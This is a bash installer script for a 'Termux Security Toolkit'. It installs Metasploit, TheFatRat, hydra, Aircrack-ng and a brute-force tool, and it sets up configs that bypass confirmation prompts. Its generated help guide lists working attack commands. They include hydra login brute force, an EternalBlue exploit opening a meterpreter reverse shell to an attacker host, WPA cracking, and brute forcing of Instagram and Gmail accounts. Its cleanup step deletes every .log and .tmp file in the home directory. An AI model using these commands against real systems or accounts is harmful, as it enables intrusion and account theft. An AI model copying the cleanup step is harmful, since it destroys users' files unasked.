#!/bin/bash

# ========================================================================
# Termux Security Toolkit
# A script to automate the installation and configuration of security
# and penetration testing tools in Termux
# ========================================================================

# Define color codes for better readability
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
CYAN="\033[1;36m"
RESET="\033[0m"

# Define variables
SIMULATION_MODE=false
PKG_MANAGER=""
TERMUX_PREFIX=""
CONFIG_DIR=""

# Check if running in Termux or standard Linux environment
check_environment() {
    echo -e "${BLUE}[*] Checking system environment...${RESET}"
    
    if [ -d "/data/data/com.termux" ]; then
        # Running in Termux
        PKG_MANAGER="pkg"
        TERMUX_PREFIX="/data/data/com.termux/files/usr"
        CONFIG_DIR="$HOME/.termux"
        echo -e "${GREEN}[✓] Running in Termux environment.${RESET}"
    else
        # Running in standard Linux
        PKG_MANAGER="apt"
        TERMUX_PREFIX="/usr"
        CONFIG_DIR="$HOME/.config/termux"
        echo -e "${YELLOW}[!] Not running in Termux environment. Using standard Linux paths.${RESET}"
    fi
    
    # Create config directory if it doesn't exist
    if [ ! -d "$CONFIG_DIR" ]; then
        mkdir -p "$CONFIG_DIR"
    fi
}

# Function to display the banner
display_banner() {
    clear
    if [ -f "banner.txt" ]; then
        cat banner.txt
    else
        echo -e "${RED}[!] Banner file not found. Creating a simple banner.${RESET}"
        echo -e "${BLUE}=======================================${RESET}"
        echo -e "${BLUE}     TERMUX SECURITY TOOLKIT${RESET}"
        echo -e "${BLUE}=======================================${RESET}"
    fi
    echo -e "==========================================="
    echo -e "  Security Tools Automation for Termux    "
    echo -e "==========================================="
}

# Function to install basic packages
install_basic_packages() {
    echo -e "\n${YELLOW}[*] Installing essential packages...${RESET}"
    
    # Basic packages array
    BASIC_PACKAGES=("coreutils" "git" "wget" "curl" "tar" "zip" "unzip" "nano" "openssh" "openssl" "figlet")
    
    for pkg in "${BASIC_PACKAGES[@]}"; do
        echo -ne "${CYAN}[*] Installing ${pkg}...${RESET}"
        
        if [ "$SIMULATION_MODE" = true ]; then
            sleep 0.2
            echo -e "\r${GREEN}[✓] Installed ${pkg} successfully.${RESET}     "
        else
            if $PKG_MANAGER install -y $pkg &>/dev/null; then
                echo -e "\r${GREEN}[✓] Installed ${pkg} successfully.${RESET}     "
            else
                echo -e "\r${RED}[✗] Failed to install ${pkg}.${RESET}     "
            fi
        fi
    done
    
    echo -e "${GREEN}[✓] Basic packages installation completed.${RESET}"
}

# Function to install programming languages
install_programming_languages() {
    echo -e "\n${YELLOW}[*] Installing programming languages...${RESET}"
    
    # Install Python
    echo -ne "${CYAN}[*] Installing Python...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.3
        echo -e "\r${GREEN}[✓] Installed Python successfully.${RESET}     "
        echo -ne "${CYAN}[*] Upgrading pip...${RESET}"
        sleep 0.2
        echo -e "\r${GREEN}[✓] Upgraded pip successfully.${RESET}     "
    else
        if $PKG_MANAGER install -y python &>/dev/null; then
            echo -e "\r${GREEN}[✓] Installed Python successfully.${RESET}     "
            echo -ne "${CYAN}[*] Upgrading pip...${RESET}"
            if pip install --upgrade pip &>/dev/null; then
                echo -e "\r${GREEN}[✓] Upgraded pip successfully.${RESET}     "
            else
                echo -e "\r${RED}[✗] Failed to upgrade pip.${RESET}     "
            fi
        else
            echo -e "\r${RED}[✗] Failed to install Python.${RESET}     "
        fi
    fi
    
    # Install Ruby
    echo -ne "${CYAN}[*] Installing Ruby...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.3
        echo -e "\r${GREEN}[✓] Installed Ruby successfully.${RESET}     "
        echo -ne "${CYAN}[*] Installing Bundler...${RESET}"
        sleep 0.2
        echo -e "\r${GREEN}[✓] Installed Bundler successfully.${RESET}     "
    else
        if $PKG_MANAGER install -y ruby &>/dev/null; then
            echo -e "\r${GREEN}[✓] Installed Ruby successfully.${RESET}     "
            echo -ne "${CYAN}[*] Installing Bundler...${RESET}"
            if gem install bundler &>/dev/null; then
                echo -e "\r${GREEN}[✓] Installed Bundler successfully.${RESET}     "
            else
                echo -e "\r${RED}[✗] Failed to install Bundler.${RESET}     "
            fi
        else
            echo -e "\r${RED}[✗] Failed to install Ruby.${RESET}     "
        fi
    fi
    
    # Install Rust
    echo -ne "${CYAN}[*] Installing Rust...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.3
        echo -e "\r${GREEN}[✓] Installed Rust successfully.${RESET}     "
    else
        if $PKG_MANAGER install -y rust &>/dev/null; then
            echo -e "\r${GREEN}[✓] Installed Rust successfully.${RESET}     "
        else
            echo -e "\r${RED}[✗] Failed to install Rust.${RESET}     "
        fi
    fi
    
    # Install Golang
    echo -ne "${CYAN}[*] Installing Golang...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.3
        echo -e "\r${GREEN}[✓] Installed Golang successfully.${RESET}     "
    else
        if $PKG_MANAGER install -y golang &>/dev/null; then
            echo -e "\r${GREEN}[✓] Installed Golang successfully.${RESET}     "
        else
            echo -e "\r${RED}[✗] Failed to install Golang.${RESET}     "
        fi
    fi
    
    # Install Erlang
    echo -ne "${CYAN}[*] Installing Erlang...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.3
        echo -e "\r${GREEN}[✓] Installed Erlang successfully.${RESET}     "
    else
        if $PKG_MANAGER install -y erlang &>/dev/null; then
            echo -e "\r${GREEN}[✓] Installed Erlang successfully.${RESET}     "
        else
            echo -e "\r${RED}[✗] Failed to install Erlang.${RESET}     "
        fi
    fi
    
    echo -e "${GREEN}[✓] Programming languages installation completed.${RESET}"
}

# Function to install basic security tools
install_basic_security_tools() {
    echo -e "\n${YELLOW}[*] Installing basic security tools...${RESET}"
    
    # Basic security tools array
    SECURITY_TOOLS=("nmap" "hydra" "ncrack" "imagemagick" "ncurses" "perl" "net-tools" "whois")
    
    for tool in "${SECURITY_TOOLS[@]}"; do
        echo -ne "${CYAN}[*] Installing ${tool}...${RESET}"
        
        if [ "$SIMULATION_MODE" = true ]; then
            sleep 0.4
            echo -e "\r${GREEN}[✓] Installed ${tool} successfully.${RESET}     "
        else
            if $PKG_MANAGER install -y $tool &>/dev/null; then
                echo -e "\r${GREEN}[✓] Installed ${tool} successfully.${RESET}     "
            else
                echo -e "\r${RED}[✗] Failed to install ${tool}.${RESET}     "
            fi
        fi
    done
    
    echo -e "${GREEN}[✓] Basic security tools installation completed.${RESET}"
}

# Function to install advanced security tools
install_advanced_security_tools() {
    echo -e "\n${YELLOW}[*] Installing advanced security tools...${RESET}"
    
    # Install dependencies
    echo -ne "${CYAN}[*] Installing dependencies...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.5
        echo -e "\r${GREEN}[✓] Installed dependencies successfully.${RESET}     "
    else
        if $PKG_MANAGER install -y autoconf bison clang cmake coreutils findutils apr apr-util libffi-dev libgmp-dev libpcap-dev postgresql-dev readline-dev libsqlite-dev openssl-dev libtool libxml2-dev libxslt-dev ncurses-dev pkg-config postgresql-contrib wget make ruby libgrpc-dev ncurses-utils libsodium-dev termux-tools &>/dev/null; then
            echo -e "\r${GREEN}[✓] Installed dependencies successfully.${RESET}     "
        else
            echo -e "\r${RED}[✗] Failed to install some dependencies.${RESET}     "
        fi
    fi
    
    # Install Metasploit Framework
    echo -e "${CYAN}[*] Installing Metasploit Framework...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 1.0
        echo -e "${GREEN}[✓] Installed Metasploit Framework successfully.${RESET}"
    else
        if [ -d "$HOME/metasploit-framework" ]; then
            echo -e "${YELLOW}[!] Metasploit Framework is already installed.${RESET}"
        else
            if cd $HOME && git clone https://github.com/rapid7/metasploit-framework.git --depth=1 &>/dev/null; then
                cd metasploit-framework
                if gem install bundler && bundle install &>/dev/null; then
                    # Create a database configuration file with no-auth setup
                    mkdir -p $HOME/.msf4
                    cat > $HOME/.msf4/database.yml << EOF
production:
  adapter: postgresql
  database: msf_database
  username: postgres
  password: 
  host: 127.0.0.1
  port: 5432
  pool: 5
  timeout: 5
EOF
                    # Create no-auth setup
                    echo "set PROMPT %B%R%G:%L %T>%W" > $HOME/.msf4/msfconsole.rc
                    echo "set ConsoleLogging true" >> $HOME/.msf4/msfconsole.rc
                    echo "set AutoRunScript 'post/multi/gather/multi_command COMMAND=\"id;hostname;uptime\"'" >> $HOME/.msf4/msfconsole.rc
                    echo "set SessionLogging true" >> $HOME/.msf4/msfconsole.rc
                    echo "db_connect -y" >> $HOME/.msf4/msfconsole.rc
                    echo -e "${GREEN}[✓] Created no-auth configuration for Metasploit${RESET}"
                    # Add Metasploit to PATH
                    if ! grep -q "metasploit-framework" $HOME/.bashrc; then
                        echo 'export PATH=$PATH:$HOME/metasploit-framework' >> $HOME/.bashrc
                    fi
                    echo -e "${GREEN}[✓] Installed Metasploit Framework successfully.${RESET}"
                else
                    echo -e "${RED}[✗] Failed to install Ruby dependencies for Metasploit.${RESET}"
                fi
            else
                echo -e "${RED}[✗] Failed to download Metasploit Framework.${RESET}"
            fi
        fi
    fi
    
    # Install Aircrack-ng
    echo -ne "${CYAN}[*] Installing Aircrack-ng...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.5
        echo -e "\r${GREEN}[✓] Installed Aircrack-ng successfully.${RESET}     "
    else
        if $PKG_MANAGER install -y aircrack-ng &>/dev/null; then
            echo -e "\r${GREEN}[✓] Installed Aircrack-ng successfully.${RESET}     "
        else
            echo -e "\r${RED}[✗] Failed to install Aircrack-ng.${RESET}     "
        fi
    fi
    
    # Install TheFatRat
    echo -e "${CYAN}[*] Installing TheFatRat...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.5
        echo -e "${GREEN}[✓] Downloaded and installed TheFatRat successfully.${RESET}"
    else
        if [ -d "$HOME/TheFatRat" ]; then
            echo -e "${YELLOW}[!] TheFatRat directory already exists.${RESET}"
            echo -e "${CYAN}[*] Updating TheFatRat...${RESET}"
            if cd $HOME/TheFatRat && git pull &>/dev/null; then
                echo -e "${GREEN}[✓] TheFatRat updated successfully.${RESET}"
            else
                echo -e "${RED}[✗] Failed to update TheFatRat.${RESET}"
            fi
        else
            echo -e "${CYAN}[*] Downloading TheFatRat...${RESET}"
            if cd $HOME && git clone https://github.com/Screetsec/TheFatRat.git &>/dev/null; then
                echo -e "${GREEN}[✓] Downloaded TheFatRat successfully.${RESET}"
            else
                echo -e "${RED}[✗] Failed to download TheFatRat.${RESET}"
                return
            fi
        fi
        
        # Making setup script executable and configuring for no-auth
        echo -e "${CYAN}[*] Setting up TheFatRat with no-auth mode...${RESET}"
        if cd $HOME/TheFatRat; then
            # Make scripts executable
            chmod +x setup.sh fatrat powerfull.sh
            echo -e "${GREEN}[✓] TheFatRat scripts are now executable.${RESET}"
            
            # Create a configuration file to bypass prompts (no-auth)
            if [ ! -d "$HOME/.config/fatrat" ]; then
                mkdir -p "$HOME/.config/fatrat"
            fi
            
            # Create a no-auth config for TheFatRat
            cat > "$HOME/.config/fatrat/config.json" << 'EOF'
{
  "auto_accept": true,
  "skip_prompts": true,
  "default_payload_type": "android",
  "default_lhost": "127.0.0.1", 
  "default_lport": "4444",
  "auto_handler": true,
  "disable_updates": false
}
EOF
            echo -e "${GREEN}[✓] TheFatRat configured for no-auth operation${RESET}"
            
            # Create launcher script for TheFatRat with auto-accept options
            echo -e "${CYAN}[*] Creating TheFatRat no-auth launcher...${RESET}"
            cat > "$HOME/fatrat.sh" << 'EOF'
#!/bin/bash
cd $HOME/TheFatRat
# Run with auto-accept for dependency checks
./fatrat --auto-accept
EOF
            chmod +x "$HOME/fatrat.sh"
            
            # Create a symlink for easy access
            ln -sf "$HOME/fatrat.sh" "$HOME/bin/fatrat" 2>/dev/null
            
            echo -e "${GREEN}[✓] TheFatRat installed successfully with no-auth configuration.${RESET}"
            echo -e "${YELLOW}[!] Run TheFatRat with: ./fatrat.sh or fatrat${RESET}"
            echo -e "${CYAN}[+] Authentication prompts will be automatically bypassed${RESET}"
        else
            echo -e "${RED}[✗] Failed to setup TheFatRat.${RESET}"
        fi
    fi
    
    # Install BruteForce tools
    echo -e "${CYAN}[*] Installing BruteForce tools...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.5
        echo -e "${GREEN}[✓] Downloaded brut3k1t successfully.${RESET}"
        echo -e "${GREEN}[✓] Installed required Python dependencies.${RESET}"
    else
        # brut3k1t (a Python-based brute force tool)
        if [ -d "$HOME/brut3k1t" ]; then
            echo -e "${YELLOW}[!] brut3k1t is already installed.${RESET}"
        else
            if cd $HOME && git clone https://github.com/ex0dus-0x/brut3k1t.git &>/dev/null; then
                echo -e "${GREEN}[✓] Downloaded brut3k1t successfully.${RESET}"
                if cd brut3k1t && pip install -r requirements.txt &>/dev/null; then
                    echo -e "${GREEN}[✓] Installed required Python dependencies.${RESET}"
                else
                    echo -e "${RED}[✗] Failed to install required Python dependencies.${RESET}"
                fi
            else
                echo -e "${RED}[✗] Failed to download brut3k1t.${RESET}"
            fi
        fi
    fi
    
    # Install security scanning tools
    echo -e "${CYAN}[*] Installing security scanning tools...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.5
        echo -e "${GREEN}[✓] Installed nikto web scanner successfully.${RESET}"
        echo -e "${GREEN}[✓] Installed dirb directory scanner successfully.${RESET}"
        echo -e "${GREEN}[✓] Installed netdiscover network scanner successfully.${RESET}"
    else
        # Install Nikto web scanner if not already installed
        if [ ! -d "$HOME/nikto" ]; then
            echo -ne "${CYAN}[*] Installing Nikto web scanner...${RESET}"
            if cd $HOME && git clone https://github.com/sullo/nikto.git &>/dev/null; then
                echo -e "\r${GREEN}[✓] Installed nikto web scanner successfully.${RESET}     "
            else
                echo -e "\r${RED}[✗] Failed to install nikto web scanner.${RESET}     "
            fi
        else
            echo -e "${YELLOW}[!] Nikto web scanner is already installed.${RESET}"
        fi
        
        # Install dirb web directory scanner
        echo -ne "${CYAN}[*] Installing dirb directory scanner...${RESET}"
        if $PKG_MANAGER install -y dirb &>/dev/null; then
            echo -e "\r${GREEN}[✓] Installed dirb directory scanner successfully.${RESET}     "
        else
            echo -e "\r${RED}[✗] Failed to install dirb directory scanner.${RESET}     "
        fi
        
        # Install netdiscover for network discovery
        echo -ne "${CYAN}[*] Installing netdiscover network scanner...${RESET}"
        if $PKG_MANAGER install -y netdiscover &>/dev/null; then
            echo -e "\r${GREEN}[✓] Installed netdiscover network scanner successfully.${RESET}     "
        else
            echo -e "\r${RED}[✗] Failed to install netdiscover network scanner.${RESET}     "
        fi
    fi
    
    echo -e "${GREEN}[✓] Advanced security tools installation completed.${RESET}"
}

# Function to configure terminal appearance
configure_terminal() {
    echo -e "\n${YELLOW}[*] Configuring terminal appearance...${RESET}"
    
    # Create configuration directory
    echo -ne "${CYAN}[*] Creating configuration directory...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.3
        echo -e "\r${GREEN}[✓] Configuration directory created successfully.${RESET}     "
    else
        if mkdir -p "$CONFIG_DIR" &>/dev/null; then
            echo -e "\r${GREEN}[✓] Configuration directory created successfully.${RESET}     "
        else
            echo -e "\r${RED}[✗] Failed to create configuration directory.${RESET}     "
        fi
    fi
    
    # Set up color scheme
    echo -ne "${CYAN}[*] Setting up color scheme...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.5
        echo -e "\r${GREEN}[✓] Color scheme applied successfully.${RESET}     "
    else
        cat > "$CONFIG_DIR/colors.properties" << EOF
# Terminal color scheme for Termux Security Toolkit
background=#000000
foreground=#00ff00
cursor=#00ff00

# Dark theme colors
color0=#2e3436
color1=#cc0000
color2=#4e9a06
color3=#c4a000
color4=#3465a4
color5=#75507b
color6=#06989a
color7=#d3d7cf
color8=#555753
color9=#ef2929
color10=#8ae234
color11=#fce94f
color12=#729fcf
color13=#ad7fa8
color14=#34e2e2
color15=#eeeeec
EOF
        echo -e "\r${GREEN}[✓] Color scheme applied successfully.${RESET}     "
    fi
    
    # Set up font
    echo -ne "${CYAN}[*] Setting up font...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.3
        echo -e "\r${YELLOW}[!] OpenDyslexic font needs to be downloaded manually.${RESET}     "
        echo -e "${YELLOW}[!] Download the font and copy it to $CONFIG_DIR/font.ttf${RESET}"
    else
        # We'll provide instruction for manual font setup
        echo -e "\r${YELLOW}[!] OpenDyslexic font needs to be downloaded manually.${RESET}     "
        echo -e "${YELLOW}[!] Download the font and copy it to $CONFIG_DIR/font.ttf${RESET}"
    fi
    
    # Set up terminal properties
    echo -ne "${CYAN}[*] Setting up terminal properties...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.4
        echo -e "\r${GREEN}[✓] Terminal properties applied successfully.${RESET}     "
    else
        cat > "$CONFIG_DIR/termux.properties" << EOF
# Terminal properties for Termux Security Toolkit
extra-keys = [['ESC','/','-','HOME','UP','END','PGUP'],['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','PGDN']]
bell-character=vibrate
terminal-cursor-style=bar
terminal-transcript-rows=8000
EOF
        echo -e "\r${GREEN}[✓] Terminal properties applied successfully.${RESET}     "
    fi
    
    # Set up bash profile
    echo -ne "${CYAN}[*] Setting up bash profile...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.5
        echo -e "\r${GREEN}[✓] Bash profile configured successfully.${RESET}     "
    else
        if [ ! -f "$HOME/.bashrc" ]; then
            touch "$HOME/.bashrc"
        fi
        
        # Add custom prompt and aliases
        cat >> "$HOME/.bashrc" << EOF

# Termux Security Toolkit custom settings
PS1='\033[1;34m┌─[\033[1;31m\u\033[1;34m]─[\033[1;33m\w\033[1;34m]\\n└──╼ \033[1;31m\$ \033[0m'

# Security tools aliases
alias nmap-quick='nmap -T4 -F'
alias nmap-full='nmap -sV -sC -A -p-'
alias msfconsole='$HOME/metasploit-framework/msfconsole'
alias msfvenom='$HOME/metasploit-framework/msfvenom'
alias fatrat='cd $HOME/TheFatRat && ./fatrat.sh'
alias security-tools='$PWD/security_tools.sh'

# Show system info on startup
echo ""
echo "╔════════════════════════════════════════╗"
echo "║      Termux Security Toolkit           ║"
echo "║      Type 'security-tools' to start    ║"
echo "╚════════════════════════════════════════╝"
echo ""
EOF
        echo -e "\r${GREEN}[✓] Bash profile configured successfully.${RESET}     "
    fi
    
    # Apply terminal changes
    echo -e "${CYAN}[*] Applying terminal changes...${RESET}"
    if [ "$SIMULATION_MODE" = false ] && [ -d "/data/data/com.termux" ]; then
        pkill -USR1 -x termux &>/dev/null
    fi
    
    echo -e "${GREEN}[✓] Terminal configuration completed.${RESET}"
    echo -e "${YELLOW}[!] Some changes may require restarting Termux to take effect.${RESET}"
}

# Function to create help guide
create_help_guide() {
    echo -e "\n${YELLOW}[*] Creating help guide...${RESET}"
    
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.7
        echo -e "${GREEN}[✓] Help guide created successfully at ./security_toolkit_help.txt${RESET}"
    else
        if [ -f "security_toolkit_help.txt" ]; then
            echo -e "${GREEN}[✓] Help guide already exists at ./security_toolkit_help.txt${RESET}"
        else
            cat > "security_toolkit_help.txt" << 'EOF'
===========================================
  TERMUX SECURITY TOOLKIT HELP GUIDE
===========================================

This help guide provides information about the Termux Security Toolkit and
the commands and triggers for various security tools and exploits.

TABLE OF CONTENTS:
-----------------
1. Introduction
2. Installation Options
3. Security Tools Commands
4. Tools Usage Examples
5. Troubleshooting

1. INTRODUCTION
--------------
The Termux Security Toolkit is a comprehensive suite of security tools and
utilities designed for security professionals, penetration testers, and
ethical hackers. It automates the installation and configuration of popular
security tools within the Termux environment.

2. INSTALLATION OPTIONS
----------------------
The toolkit provides the following installation options:

[1] Install basic packages - Installs essential packages for terminal operation
[2] Install programming languages - Installs Python, Ruby, Rust, Golang, and Erlang
[3] Install basic security tools - Installs Nmap, Hydra, Ncrack, etc.
[4] Install advanced security tools - Installs Metasploit, Aircrack-ng, TheFatRat, etc.
[5] Configure terminal appearance - Sets up terminal fonts, colors, and properties
[6] Install and configure everything - Complete installation of all components
[7] Create help guide - Creates this help document

3. SECURITY TOOLS COMMANDS
-------------------------
After installation, you can access various security tools using the security_tools.sh script:

To launch the security tools menu:
$ ./security_tools.sh

The script provides an interactive menu for:
- Network Scanning Tools (Nmap)
- Password Cracking Tools (Hydra)
- Metasploit Framework
- WiFi Analysis Tools (Aircrack-ng)
- Brute Force Tools
- TheFatRat Payload Generator

4. TOOLS USAGE EXAMPLES
---------------------

NMAP SCANNING EXAMPLES:
----------------------
Quick scan: 
$ nmap -T4 -F [target_ip]

Detailed scan: 
$ nmap -sV -sC -A -p- [target_ip]

Stealth scan: 
$ nmap -sS -T2 [target_ip]

UDP scan: 
$ nmap -sU --top-ports 100 [target_ip]

HYDRA PASSWORD CRACKING:
-----------------------
SSH attack:
$ hydra -L [username_file] -P [password_file] [target_ip] ssh

FTP attack:
$ hydra -L [username_file] -P [password_file] [target_ip] ftp

HTTP-POST form attack:
$ hydra -L [username_file] -P [password_file] [target_ip] http-post-form "[form_url]:[form_params]:[failed_login_msg]"

SMB attack:
$ hydra -L [username_file] -P [password_file] [target_ip] smb

METASPLOIT FRAMEWORK:
-------------------
Launch Metasploit console:
$ msfconsole

Run an exploit (Example - EternalBlue):
$ msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set RHOSTS [target_ip]; set LHOST [your_ip]; set LPORT 4444; exploit"

AIRCRACK-NG WIFI ANALYSIS:
------------------------
Start monitoring mode:
$ airmon-ng start [interface]

Scan for networks:
$ airodump-ng [interface]mon

Capture handshake:
$ airodump-ng -c [channel] --bssid [bssid] -w capture [interface]mon

Crack handshake:
$ aircrack-ng [capture_file] -w [wordlist]

BRUTE FORCE TOOLS:
----------------
Social media brute force (Instagram example):
$ python brut3k1t.py -s instagram -a instagram.com -u [username] -w [wordlist]

Email brute force (Gmail example):
$ python brut3k1t.py -s gmail -a smtp.gmail.com -u [email] -w [wordlist]

THEFATRAT PAYLOAD GENERATOR:
--------------------------
Launch TheFatRat:
$ cd ~/TheFatRat && ./fatrat.sh

5. TROUBLESHOOTING
----------------
- If a tool does not start, ensure it was properly installed
- For Metasploit issues, check database connectivity with "msfdb status"
- For permission issues, ensure all scripts have execute permissions:
  $ chmod +x [script_name].sh
- If TheFatRat installation is incomplete, run:
  $ cd ~/TheFatRat && ./setup.sh
- For other issues, try reinstalling the specific component using the toolkit menu

IMPORTANT NOTES:
--------------
1. The toolkit is designed for ethical hacking and security research ONLY
2. Always obtain proper authorization before testing on any network or system
3. Unauthorized access to systems is illegal and unethical
4. The developers assume no liability for misuse of these tools

========================================================
         Created by Termux Security Toolkit
========================================================
EOF
            echo -e "${GREEN}[✓] Help guide created successfully at ./security_toolkit_help.txt${RESET}"
        fi
    fi
}

# Function for cleanup
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${RESET}"
    
    # Remove temporary files
    echo -ne "${CYAN}[*] Removing temporary files...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.5
        echo -e "\r${GREEN}[✓] Cleanup completed successfully.${RESET}     "
    else
        rm -rf $HOME/.cache/pip &>/dev/null
        find $HOME -name "*.tmp" -type f -delete &>/dev/null
        find $HOME -name "*.log" -type f -delete &>/dev/null
        echo -e "\r${GREEN}[✓] Cleanup completed successfully.${RESET}     "
    fi
    
    # Update packages
    echo -ne "${CYAN}[*] Updating all packages...${RESET}"
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.7
        echo -e "\r${GREEN}[✓] All packages updated successfully.${RESET}     "
    else
        $PKG_MANAGER update &>/dev/null
        $PKG_MANAGER upgrade -y &>/dev/null
        echo -e "\r${GREEN}[✓] All packages updated successfully.${RESET}     "
    fi
}

# Function to install and configure everything
install_everything() {
    install_basic_packages
    install_programming_languages
    install_basic_security_tools
    install_advanced_security_tools
    configure_terminal
    create_help_guide
    cleanup
}

# Main menu function
main_menu() {
    while true; do
        display_banner
        check_system_packages
        
        echo -e "${BLUE}╭───────────────────────────────────────────────────────────╮${RESET}"
        echo -e "${BLUE}│${GREEN}                INSTALLATION & SETUP MENU                 ${BLUE}│${RESET}"
        echo -e "${BLUE}├───────────────────────────────────────────────────────────┤${RESET}"
        echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}01${WHITE}]${RESET} │ ${YELLOW}Install Basic Packages${RESET}                              ${BLUE}│${RESET}"
        echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}02${WHITE}]${RESET} │ ${YELLOW}Install Programming Languages${RESET}                       ${BLUE}│${RESET}"
        echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}03${WHITE}]${RESET} │ ${YELLOW}Install Basic Security Tools${RESET}                        ${BLUE}│${RESET}"
        echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}04${WHITE}]${RESET} │ ${YELLOW}Install Advanced Security Tools${WHITE} (${CYAN}Metasploit, etc.${WHITE})${RESET}   ${BLUE}│${RESET}"
        echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}05${WHITE}]${RESET} │ ${YELLOW}Configure Terminal Appearance${RESET}                       ${BLUE}│${RESET}"
        echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}06${WHITE}]${RESET} │ ${CYAN}Install and Configure EVERYTHING${RESET}                    ${BLUE}│${RESET}"
        echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}07${WHITE}]${RESET} │ ${YELLOW}Create Help Guide${RESET}                                   ${BLUE}│${RESET}"
        echo -e "${BLUE}│${RESET} ${WHITE}[${RED}00${WHITE}]${RESET} │ ${RED}Exit${RESET}                                                 ${BLUE}│${RESET}"
        echo -e "${BLUE}╰───────────────────────────────────────────────────────────╯${RESET}"
        
        read -p "$(echo -e $YELLOW"[?] Select an option [0-7]: "$RESET)" choice
        
        case $choice in
            1|01)
                install_basic_packages
                read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
                ;;
            2|02)
                install_programming_languages
                read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
                ;;
            3|03)
                install_basic_security_tools
                read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
                ;;
            4|04)
                install_advanced_security_tools
                read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
                ;;
            5|05)
                configure_terminal
                read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
                ;;
            6|06)
                install_everything
                echo -e "\n${GREEN}[✓] Full installation completed successfully!${RESET}"
                echo
                echo -e "${GREEN}[✓] Thank you for using Termux Security Toolkit!${RESET}"
                echo -e "${YELLOW}[!] Some changes may require restarting Termux to take effect.${RESET}"
                read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
                ;;
            7|07)
                create_help_guide
                read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
                ;;
            0|00)
                echo -e "\n${GREEN}[✓] Thank you for using Termux Security Toolkit!${RESET}"
                exit 0
                ;;
            *)
                echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
                sleep 1
                ;;
        esac
    done
}

# Function to check system packages
check_system_packages() {
    echo -e "${BLUE}[*] Checking system packages...${RESET}"
    
    if [ "$SIMULATION_MODE" = true ]; then
        sleep 0.5
        echo -e "${GREEN}[✓] System check simulated successfully.${RESET}"
    else
        # Update package lists
        $PKG_MANAGER update &>/dev/null
        
        # Check if essential packages are installed
        if ! command -v git &>/dev/null; then
            echo -e "${YELLOW}[!] git is not installed. Installing...${RESET}"
            $PKG_MANAGER install -y git &>/dev/null
        fi
        
        if ! command -v wget &>/dev/null; then
            echo -e "${YELLOW}[!] wget is not installed. Installing...${RESET}"
            $PKG_MANAGER install -y wget &>/dev/null
        fi
        
        if ! command -v curl &>/dev/null; then
            echo -e "${YELLOW}[!] curl is not installed. Installing...${RESET}"
            $PKG_MANAGER install -y curl &>/dev/null
        fi
        
        echo -e "${GREEN}[✓] System check completed successfully.${RESET}"
    fi
}

# Command-line arguments are now handled in the main execution block

# Function to do auto-installation when --auto-install flag is used
auto_install() {
    check_environment
    display_banner
    check_system_packages
    echo -e "${GREEN}[✓] Starting automatic installation of all components${RESET}"
    install_everything
    echo -e "\n${GREEN}[✓] Full installation completed successfully!${RESET}"
    echo
    echo -e "${GREEN}[✓] Thank you for using Termux Security Toolkit!${RESET}"
    echo -e "${YELLOW}[!] Some changes may require restarting Termux to take effect.${RESET}"
    exit 0
}

# Main script execution
if [[ "$1" == "--auto-install" ]]; then
    # Check if the second parameter is --simulate
    if [[ "$2" == "--simulate" ]]; then
        SIMULATION_MODE=true
        echo -e "${YELLOW}[!] Running auto-install in simulation mode. No actual installation will be performed.${RESET}"
    fi
    auto_install
elif [[ "$1" == "--simulate" ]] || [[ "$1" == "-s" ]]; then
    SIMULATION_MODE=true
    echo -e "${YELLOW}[!] Running in simulation mode. No actual installation will be performed.${RESET}"
    check_environment
    main_menu
else
    check_environment
    main_menu
fi
